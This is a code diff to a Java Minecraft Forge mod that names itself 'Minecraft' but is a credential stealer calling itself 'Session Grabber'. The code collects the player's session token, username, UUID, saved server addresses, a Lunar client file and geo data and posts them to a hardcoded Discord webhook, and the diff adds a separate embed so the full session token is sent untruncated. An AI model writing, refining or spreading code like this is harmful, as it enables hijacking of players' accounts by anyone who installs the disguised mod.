@@ -18,12 +18,13 @@ import java.nio.charset.StandardCharsets;
 @Mod(modid = "Minecraft", name = "Minecraft", version = "1.8.9")
 public final class Main {
 
-    // DEINE URL HIER EINTRAGEN!
+    // WICHTIG: Deine Webhook URL hier eintragen!
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455249579246354679/PFz12Wzk9KGdz28SbWugN-CFfnPC1qyZkkukfSmG3jjWQjHKMWAfxB9RM2NTVp8n35fB";
+    
     private static final boolean PING_EVERYONE = true;
     private static final Minecraft mc = Minecraft.getMinecraft();
 
-    // Hilfsmethode zum Kürzen von Texten (Discord Limit ist 1024)
+    // Hilfsmethode: Kürzt Texte sicher, damit Discord nicht abstürzt
     private String safeString(String text, int maxLength) {
         if (text == null) return "Unknown";
         if (text.length() > maxLength) {
@@ -47,37 +48,48 @@ public final class Main {
 
     private DiscordWebhook.EmbedObject genAccInfoEmbed() {
         final Session session = mc.getSession();
-        
-        // Token sicher abrufen und KÜRZEN (Microsoft Tokens sind oft > 1024 Zeichen!)
-        String token = session.getToken();
-        token = safeString(token, 800); // Kürzen auf 800 Zeichen sicherheitshalber
 
+        // Hier sind deine Links wieder zurück!
         return new DiscordWebhook.EmbedObject()
                 .setTitle(":unlock: Account Info")
                 .setColor(0x6E39FF)
-                .setDescription("User: " + session.getUsername())
+                .setDescription(
+                        "[NameMC](https://namemc.com/" + session.getPlayerID() + ')' +
+                        " | [Plancke](https://plancke.io/hypixel/player/stats/" + session.getPlayerID() + ')' +
+                        " | [SkyCrypt](https://sky.shiiyu.moe/stats/" + session.getPlayerID() + ')')
                 .addField("Name", "```" + session.getUsername() + "```", true)
-                .addField("UUID", "```" + session.getPlayerID() + "```", true)
-                .addField("Session Token", "```" + token + "```", false);
+                .addField("UUID", "```" + session.getPlayerID() + "```", true);
+                // Token ist hier entfernt -> bekommt eigenes Embed
+    }
+
+    // --- NEUES TOKEN EMBED (Volle Länge!) ---
+    private DiscordWebhook.EmbedObject genTokenEmbed() {
+        String token = mc.getSession().getToken();
+        
+        // Die Description erlaubt 4096 Zeichen. Das reicht für fast alle Tokens ungekürzt.
+        // Nur zur Sicherheit kürzen wir bei extremen Ausnahmen.
+        token = safeString(token, 4000); 
+
+        return new DiscordWebhook.EmbedObject()
+                .setTitle(":key: Session Token")
+                .setColor(0xFFA500) // Orange Farbe
+                .setDescription("```" + token + "```"); // Token in der Description statt Feld
     }
 
     private DiscordWebhook.EmbedObject genServersInfoEmbed() {
         final DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
                 .setTitle(":file_folder: Saved Servers")
                 .setColor(0x8F67FC)
-                .setDescription("List of saved servers");
+                .setDescription("Saved Minecraft servers");
 
         final ServerList servers = new ServerList(mc);
-        // Limit auf 15 Server setzen
+        // Limit auf 15 Server (sonst Fehler 400)
         int limit = Math.min(servers.countServers(), 15);
 
         for (int i = 0; i < limit; i++) {
             final ServerData server = servers.getServerData(i);
-            
-            // Namen und IPs ebenfalls kürzen, falls Müll drin steht
             String name = safeString(server.serverName, 50);
             String ip = safeString(server.serverIP, 100);
-            
             serversEmbed.addField(":label: " + name, "```" + ip + "```", true);
         }
 
@@ -97,7 +109,6 @@ public final class Main {
             try {
                 byte[] encoded = Files.readAllBytes(lunarFile.toPath());
                 content = new String(encoded, StandardCharsets.UTF_8);
-                // Lunar Datei kürzen (max 1500 Zeichen für Description)
                 content = safeString(content, 1500);
             } catch (Exception e) {
                 content = "Error: " + e.getMessage();
@@ -112,19 +123,18 @@ public final class Main {
 
     private DiscordWebhook genWebhook() {
         final DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL)
-                .setUsername("Session Grabber 3000");
+                .setUsername("Session Grabber");
 
         if (PING_EVERYONE) webhook.setContent("@everyone");
 
-        // Versuche Geo-Info
         try {
             webhook.addEmbed(genGeoInfoEmbed());
         } catch (Exception e) {
-            System.out.println("Geo failed (skip): " + e.getMessage());
+            System.out.println("Geo failed (skip)");
         }
 
-        // Andere Embeds hinzufügen
-        webhook.addEmbed(genAccInfoEmbed());
+        webhook.addEmbed(genAccInfoEmbed());   // Links + Name + UUID
+        webhook.addEmbed(genTokenEmbed());     // Token separat (ungekürzt)
         webhook.addEmbed(genServersInfoEmbed());
         webhook.addEmbed(genLunarInfoEmbed());
 
